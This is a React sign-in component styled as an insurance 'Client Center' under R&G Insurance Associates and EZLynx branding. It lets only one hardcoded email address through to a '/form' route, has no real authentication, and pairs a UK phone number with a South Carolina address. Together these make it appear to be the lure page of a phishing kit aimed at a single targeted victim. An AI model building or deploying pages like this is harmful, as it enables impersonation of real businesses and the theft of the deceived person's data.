import { useState } from "react";
import { MdError } from "react-icons/md";
import { useNavigate } from "react-router-dom";

const Box = () => {
    const [gmail, setGmail] = useState('Amberfavour8@gmail.com');
    const [inputValue, setInputValue] = useState('')
    const [verification, setVerification] = useState(true);
    const navigate = useNavigate()

    const signUp = () => {
        if (inputValue === gmail) {
            setVerification(true)
            navigate('/form')
        } else {
            setVerification(false)
            setTimeout(() => {
                setVerification(true)
            }, '2000')
            setInputValue('')
        }
    }

    const hnadleChange = (e) => {
        setInputValue(e.target.value)
    }

  return (
    <div className='box w-[360px] h-[80vh] m-auto rounded-xl flex flex-col align-center justify-center px-4'>
      <h3 className='text-center text-[#0069be] text-[20px] font-[500] py-4'>Sign-in to Client Center </h3>
      
      <div className='pt-3'>
        <input 
          value={inputValue}
          onChange={hnadleChange}
          type="email" 
          placeholder='Enter Email' 
          className='input w-full p-2 outline-none'
        />
        <p className='text-sm pt-[.2rem] pb-4'>Use the email address you gave your agent</p>
      </div>

      <button 
        onClick={() => signUp()}
        className='rounded-lg bg-[#0069be] text-[#fff] p-3 hover:bg-[#0083ee]'>SIGN IN</button>
      
      <div className='pt-10 text-center'>
        <h4 className='font-bold text-[rgba(0, 0, 0, 0.8)]'>R&G Insurance Associates</h4>
        <p>Phone: +44-7508-305745</p>
        <p>4625 Patriot Pkwy, Sumter, SC 29154, United States </p>
      </div>

      <footer className='text-center pt-6'>&copy; 2023 EZLynx. All rights reserved.</footer>

      {!verification ? <div className="popup text-center">
        <div className="bg-[red] text-[#fff] p-4">
            <MdError />
            <p>Incorrect Password</p>
        </div>
      </div> : <div></div>

      }
    </div>
  )
}

export default Box
